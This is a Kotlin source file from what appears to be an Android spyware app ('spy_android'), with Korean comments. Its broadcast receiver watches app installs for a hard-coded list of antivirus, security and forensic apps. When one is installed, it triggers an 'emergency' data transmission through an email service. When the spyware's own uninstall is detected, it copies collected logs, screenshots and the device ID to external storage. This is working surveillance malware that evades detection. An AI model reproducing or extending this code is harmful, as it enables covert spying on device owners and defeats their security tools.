package com.example.spy_android.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import java.io.File

class PackageChangeReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "PackageChangeReceiver"

        // 안티바이러스 및 보안 앱들
        private val SECURITY_APPS = listOf(
            "com.avast.android.mobilesecurity",
            "com.bitdefender.security",
            "com.eset.ems2.gp",
            "com.kaspersky.android.antivirus",
            "com.mcafee.vsm_android",
            "com.symantec.mobilesecurity",
            "com.avira.android",
            "com.trustlook.android.antivirus",
            "com.lookout.android",
            "com.cleanmaster.security",
            "com.qihoo360.mobilesafe",
            "com.antiy.avl",
            "com.drweb.pro",
            "com.f_secure.safe",
            "com.trendmicro.mobilesecurity"
        )

        // 시스템 분석 도구들
        private val ANALYSIS_TOOLS = listOf(
            "com.malwarebytes.antimalware",
            "com.iobit.mobilecare",
            "com.ahnlab.v3mobileplus",
            "com.estsoft.alyac",
            "com.nprotect.mobile.agent",
            "com.samsung.android.sm.policy",
            "com.sec.android.app.securitylogagent"
        )
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        val packageName = intent.data?.schemeSpecificPart

        when (action) {
            Intent.ACTION_PACKAGE_ADDED -> {
                handlePackageAdded(context, packageName, intent)
            }
            Intent.ACTION_PACKAGE_REMOVED -> {
                handlePackageRemoved(context, packageName, intent)
            }
            Intent.ACTION_PACKAGE_REPLACED -> {
                handlePackageReplaced(context, packageName, intent)
            }
        }
    }

    private fun handlePackageAdded(context: Context, packageName: String?, intent: Intent) {
        if (packageName == null) return

        val isReplace = intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)

        Log.d(TAG, "패키지 설치됨: $packageName (교체: $isReplace)")

        val packageData = mapOf(
            "event_type" to "package_added",
            "package_name" to packageName,
            "is_replace" to isReplace,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        logPackageEvent(context, packageData)

        // 보안 앱 설치 감지
        if (isSecurityApp(packageName)) {
            handleSecurityAppInstalled(context, packageName)
        }

        // 분석 도구 설치 감지
        if (isAnalysisTool(packageName)) {
            handleAnalysisToolInstalled(context, packageName)
        }
    }

    private fun handlePackageRemoved(context: Context, packageName: String?, intent: Intent) {
        if (packageName == null) return

        val isReplace = intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)

        Log.d(TAG, "패키지 제거됨: $packageName (교체: $isReplace)")

        val packageData = mapOf(
            "event_type" to "package_removed",
            "package_name" to packageName,
            "is_replace" to isReplace,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        logPackageEvent(context, packageData)

        // 자신의 앱이 제거되려는 경우 (교체가 아닌 경우)
        if (packageName == context.packageName && !isReplace) {
            handleSelfUninstallAttempt(context)
        }
    }

    private fun handlePackageReplaced(context: Context, packageName: String?, intent: Intent) {
        if (packageName == null) return

        Log.d(TAG, "패키지 교체됨: $packageName")

        val packageData = mapOf(
            "event_type" to "package_replaced",
            "package_name" to packageName,
            "timestamp" to System.currentTimeMillis(),
            "formatted_time" to getCurrentTimeString()
        )

        logPackageEvent(context, packageData)

        // 자신의 앱이 업데이트된 경우
        if (packageName == context.packageName) {
            handleSelfUpdate(context)
        }
    }

    private fun isSecurityApp(packageName: String): Boolean {
        return SECURITY_APPS.any { packageName.contains(it, ignoreCase = true) } ||
                packageName.contains("antivirus", ignoreCase = true) ||
                packageName.contains("security", ignoreCase = true) ||
                packageName.contains("malware", ignoreCase = true) ||
                packageName.contains("protect", ignoreCase = true)
    }

    private fun isAnalysisTool(packageName: String): Boolean {
        return ANALYSIS_TOOLS.any { packageName.contains(it, ignoreCase = true) } ||
                packageName.contains("analyzer", ignoreCase = true) ||
                packageName.contains("forensic", ignoreCase = true) ||
                packageName.contains("monitor", ignoreCase = true)
    }

    private fun handleSecurityAppInstalled(context: Context, packageName: String) {
        Log.w(TAG, "보안 앱 설치 감지: $packageName")

        val emergencyData = mapOf(
            "alert_type" to "SECURITY_APP_INSTALLED",
            "package_name" to packageName,
            "threat_level" to "HIGH",
            "action_required" to "IMMEDIATE_DATA_TRANSMISSION",
            "timestamp" to System.currentTimeMillis(),
            "details" to "Security application installed: $packageName"
        )

        // 긴급 알림 파일 생성
        createEmergencyAlert(context, emergencyData)

        // 즉시 데이터 전송 트리거
        triggerEmergencyDataTransmission(context, "Security app installed: $packageName")
    }

    private fun handleAnalysisToolInstalled(context: Context, packageName: String) {
        Log.w(TAG, "분석 도구 설치 감지: $packageName")

        val emergencyData = mapOf(
            "alert_type" to "ANALYSIS_TOOL_INSTALLED",
            "package_name" to packageName,
            "threat_level" to "MEDIUM",
            "timestamp" to System.currentTimeMillis(),
            "details" to "Analysis tool installed: $packageName"
        )

        createEmergencyAlert(context, emergencyData)
    }

    private fun handleSelfUninstallAttempt(context: Context) {
        Log.e(TAG, "자체 앱 제거 시도 감지!")

        val emergencyData = mapOf(
            "alert_type" to "SELF_UNINSTALL_ATTEMPT",
            "threat_level" to "CRITICAL",
            "action_required" to "IMMEDIATE_RESPONSE",
            "timestamp" to System.currentTimeMillis(),
            "details" to "Spy app uninstall attempt detected"
        )

        createEmergencyAlert(context, emergencyData)
        triggerEmergencyDataTransmission(context, "APP UNINSTALL ATTEMPT")

        // 최후의 데이터 전송 시도
        performFinalDataDump(context)
    }

    private fun handleSelfUpdate(context: Context) {
        Log.i(TAG, "자체 앱 업데이트 감지")

        // 업데이트 후 자동 재시작
        val intent = Intent(context, com.example.spy_android.MainActivity::class.java)
        intent.action = "AUTO_START_TRACKING"
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        context.startActivity(intent)
    }

    private fun logPackageEvent(context: Context, eventData: Map<String, Any>) {
        try {
            val logDir = File(context.filesDir, "logs")
            if (!logDir.exists()) {
                logDir.mkdirs()
            }

            val logFile = File(logDir, "package_changes.log")
            val jsonData = android.text.TextUtils.join(",", eventData.map { "\"${it.key}\":\"${it.value}\"" })
            logFile.appendText("{$jsonData}\n")

        } catch (e: Exception) {
            Log.e(TAG, "패키지 이벤트 로그 저장 실패: ${e.message}")
        }
    }

    private fun createEmergencyAlert(context: Context, alertData: Map<String, Any>) {
        try {
            val alertDir = File(context.filesDir, "emergency_alerts")
            if (!alertDir.exists()) {
                alertDir.mkdirs()
            }

            val alertFile = File(alertDir, "alert_${System.currentTimeMillis()}.json")
            val jsonData = android.text.TextUtils.join(",", alertData.map { "\"${it.key}\":\"${it.value}\"" })
            alertFile.writeText("{$jsonData}")

        } catch (e: Exception) {
            Log.e(TAG, "긴급 알림 생성 실패: ${e.message}")
        }
    }

    private fun triggerEmergencyDataTransmission(context: Context, reason: String) {
        try {
            // 긴급 이메일 서비스 시작
            val serviceIntent = Intent(context, com.example.spy_android.services.EmergencyEmailService::class.java)
            serviceIntent.putExtra("emergency_reason", reason)
            context.startForegroundService(serviceIntent)

        } catch (e: Exception) {
            Log.e(TAG, "긴급 데이터 전송 트리거 실패: ${e.message}")
        }
    }

    private fun performFinalDataDump(context: Context) {
        try {
            // 모든 수집된 데이터를 압축하여 외부 저장소에 백업
            val backupDir = File(context.getExternalFilesDir(null), "emergency_backup")
            if (!backupDir.exists()) {
                backupDir.mkdirs()
            }

            // 로그 디렉토리 전체를 백업
            val logsDir = File(context.filesDir, "logs")
            if (logsDir.exists()) {
                copyDirectory(logsDir, File(backupDir, "logs"))
            }

            // 수집된 데이터 백업
            val dataDir = File(context.filesDir, "collected_data")
            if (dataDir.exists()) {
                copyDirectory(dataDir, File(backupDir, "collected_data"))
            }

            // 스크린샷 백업
            val screenshotsDir = File(context.filesDir, "screenshots")
            if (screenshotsDir.exists()) {
                copyDirectory(screenshotsDir, File(backupDir, "screenshots"))
            }

            // 최종 상태 정보 저장
            val finalStatus = mapOf(
                "final_dump_reason" to "APP_UNINSTALL_DETECTED",
                "dump_time" to System.currentTimeMillis(),
                "device_id" to android.provider.Settings.Secure.getString(
                    context.contentResolver,
                    android.provider.Settings.Secure.ANDROID_ID
                ),
                "backup_location" to backupDir.absolutePath
            )

            val statusFile = File(backupDir, "final_status.json")
            val jsonData = android.text.TextUtils.join(",", finalStatus.map { "\"${it.key}\":\"${it.value}\"" })
            statusFile.writeText("{$jsonData}")

        } catch (e: Exception) {
            Log.e(TAG, "최종 데이터 덤프 실패: ${e.message}")
        }
    }

    private fun copyDirectory(source: File, destination: File) {
        if (!destination.exists()) {
            destination.mkdirs()
        }

        source.listFiles()?.forEach { file ->
            val destFile = File(destination, file.name)
            if (file.isDirectory) {
                copyDirectory(file, destFile)
            } else {
                file.copyTo(destFile, overwrite = true)
            }
        }
    }

    private fun getCurrentTimeString(): String {
        return java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault())
            .format(java.util.Date())
    }
}